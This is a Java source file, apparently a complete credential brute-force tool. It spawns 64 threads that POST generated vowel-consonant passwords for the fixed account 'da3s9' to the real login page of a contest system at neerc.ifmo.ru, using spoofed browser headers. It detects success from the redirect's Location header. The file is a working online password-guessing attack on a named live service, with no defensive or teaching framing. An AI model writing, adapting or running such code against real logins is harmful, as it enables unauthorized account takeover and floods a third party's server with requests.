import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Arrays;
import java.util.Date;
import java.util.StringTokenizer;

public class Brute
{
	//static BufferedReader in;
	//static BufferedWriter out;
	/*static StringTokenizer st;
	static String nextToken()
	{
		while (st == null || !st.hasMoreTokens())
		{
			try
			{
				st = new StringTokenizer(in.readLine());
			}
			catch (Exception e)
			{
				return "0";
			}
		}
		return st.nextToken();
	}
	static int nextInt()
	{
		return Integer.parseInt(nextToken());
	}*/
	
	public static class Cell {
		char[] c;
		int d;
		
		public String toString() {
			return "{" + d + "}";
		}
	}
	
	public static long total(Cell[] cells) {
		long sum = 0;
		for (int i = cells.length - 1; i >= 0; --i) {
			sum += cells[i].c.length;
		}
		return sum;
	}
	
	public static boolean inc(Cell[] cells) {
		int c = 1;
		for (int i = cells.length - 1; i >= 0; --i) {
			cells[i].d += c;
			if (cells[i].d > cells[i].c.length - 1) {
				c = cells[i].d - cells[i].c.length + 1;
				cells[i].d = 0;
				continue;
			} else {
				return true;
			}
		}
		return false;
	}
	
	public static void print(char[] buffer, Cell[] cells) {
		for (int i = cells.length - 1; i >= 0; --i) {
			buffer[i] = cells[i].c[cells[i].d];
		}
	}
	
	public static void dump(Cell[] cells) {
		for (int i = 0; i < cells.length; ++i) {
			System.out.print(cells[i].d + " ");
		}
		System.out.print("\n");
	}
	
	public static boolean request(String login, char[] password) throws Exception {
		HttpURLConnection.setFollowRedirects(false);
		
		String urlParameters = "login=" + login + "&password=";
		//http://neerc.ifmo.ru/pcms2client/doLogin.jsp
		HttpURLConnection urlConnection = (HttpURLConnection) new URL("http://neerc.ifmo.ru/pcms2client/doLogin.jsp").openConnection();
		
		urlConnection.setRequestMethod("POST");
		urlConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded"); 
		urlConnection.setRequestProperty("Referer", "http://neerc.ifmo.ru/pcms2client/login.jsp");
		urlConnection.setRequestProperty("User-Agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)");
		
		urlConnection.setRequestProperty("Content-Length", "" + Integer.toString(urlParameters.getBytes().length));
		urlConnection.setDoInput(true);
		urlConnection.setDoOutput(true);

		BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(urlConnection.getOutputStream(), "windows-1251"));
		writer.write(urlParameters);
		writer.write(password, 0, password.length);
		writer.flush();
		writer.close();

		String location = urlConnection.getHeaderField("Location");
		System.out.println(location);
		if (location.length() != 42)
		{
			System.out.println("Found: " + Arrays.toString(password));
			return true;
		}
		//System.out.println("Response: " + urlConnection.getResponseCode());
		

		return false;
		// read the response
		/*Reader reader = new InputStreamReader(urlConnection.getInputStream());
		char[] chars = new char[1024];
		while (true) {
			int size = reader.read(chars);
			if (size <= 0) {
				break;
			}
			if (size == chars.length) {
				System.out.print(chars);
			} else {
				System.out.print(Arrays.copyOf(chars, size));
			}
		}
		reader.close();*/
	}
	
	public static class Worker implements Runnable {
		public static int k = 0;
		public static boolean done = false;
		private Cell[] cells;
		private char[] buffer;
		
		public Worker(Cell[] cells) {
			this.cells = cells;
			this.buffer= new char[cells.length];
		}
		
		@Override
		public void run() {
			while (true) {
				synchronized (cells) {
					inc(cells);
					print(buffer, cells);
					if (k % 1000 == 0) {
						System.out.println("Thread (" + Thread.currentThread().getName() + "): " + Arrays.toString(buffer));
					}
					if (k % 10000 == 0) {
						double per = k * 1.0 / 24883200000L;
						System.out.println(per + " " + (Math.floor(per * 1000000) / 10000) + "%");
					}
					k++;
				}
				try {
					if (request("da3s9", buffer)) {
						done = true;
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
				if (done) {
					System.out.println("Thread (" + Thread.currentThread().getName() + "): stopped");
					break;
				}
			}
		}
		
		public boolean request(String login, char[] password) throws Exception {
			HttpURLConnection.setFollowRedirects(false);
			
			String urlParameters = "login=" + login + "&password=";
			//http://neerc.ifmo.ru/pcms2client/doLogin.jsp
			HttpURLConnection urlConnection = (HttpURLConnection) new URL("http://neerc.ifmo.ru/pcms2client/doLogin.jsp").openConnection();
			
			urlConnection.setRequestMethod("POST");
			urlConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded"); 
			urlConnection.setRequestProperty("Referer", "http://neerc.ifmo.ru/pcms2client/login.jsp");
			urlConnection.setRequestProperty("User-Agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)");
			
			urlConnection.setRequestProperty("Content-Length", "" + Integer.toString(urlParameters.getBytes().length));
			urlConnection.setDoInput(true);
			urlConnection.setDoOutput(true);

			BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(urlConnection.getOutputStream(), "windows-1251"));
			writer.write(urlParameters);
			writer.write(password, 0, password.length);
			writer.flush();
			writer.close();

			String location = urlConnection.getHeaderField("Location");
			//System.out.println("Thread (" + Thread.currentThread().getName() + ") " + location);
			if (location.length() != 42)
			{
				System.out.println("Found: " + Arrays.toString(password));
				return true;
			}
			return false;
		}
	}
	
	public static void main(String args[])
	{
		try
		{
			//in = new BufferedReader(new FileReader("discreetpasswords.txt"));
			//out = new BufferedWriter(new FileWriter("discreetpasswords.out"));
			
			//nt n = 63;
			/*int[] symbols = new int[26];
			for (int i = 0; i < 63; ++i) {
				String s = nextToken();
				for (int j = 0; j < s.length(); ++j) {
					int c = s.charAt(j) - (int)'a';
					symbols[c]++;
				}
			}*/
			
			char[] p1 = new char[]{'b', 'c', 'd', 'f', 'g', 'h', 'k', 'l', 'm', 'n', 'p', 'q', 'j', 'r', 's', 't', 'v', 'w', 'x', 'z'};
			char[] p2 = new char[]{'u', 'e', 'o', 'a', 'i', 'y'};
			
			/*for (int i = 0; i < 26; ++i) {
				char c = (char)(i + (int)'a');
				System.out.println("'"+c + "', " + symbols[i]);
			}*/
			
			int n = 10;
			Cell[] cells = new Cell[n];
			for (int i = 0; i < n; ++i) {
				cells[i] = new Cell();
			}
			cells[0].c = p2;
			cells[1].c = p1;
			cells[2].c = p2;
			cells[3].c = p1;
			cells[4].c = p2;
			cells[5].c = p1;
			cells[6].c = p2;
			cells[7].c = p1;
			cells[8].c = p2;
			cells[9].c = p1;
			/*cells[0].c = new char[]{'o'};
			cells[1].c = new char[]{'x'};
			cells[2].c = new char[]{'u'};
			cells[3].c = new char[]{'t'};
			cells[4].c = new char[]{'y'};
			cells[5].c = new char[]{'v'};
			cells[6].c = new char[]{'e'};
			cells[7].c = new char[]{'p'};
			cells[8].c = new char[]{'y'};
			cells[9].c = new char[]{'b', 'c', 'd', 'f', 'g', 'h', 'k', 'l', 'm', 'n', 'p', 'q', 'j', 'r', 's', 't', 'v', 'w', 'x', 'z'};*/
			cells[cells.length - 1].d = -1;
			
			System.out.println(new Date().toString());
			for (int i = 0; i < 64; ++i) {
				Thread thread = new Thread(new Worker(cells));
				thread.setName("i="+i);
				thread.start();
			}
			
			//char[] buffer = new char[]{'o','x','u','t','y','v','e','p','y','q'};
			//request("da3s16", buffer);
			
			//in.close();
			//out.close();
		}
		catch (Exception e)
		{
			e.printStackTrace();
			return;
		}
	}
}
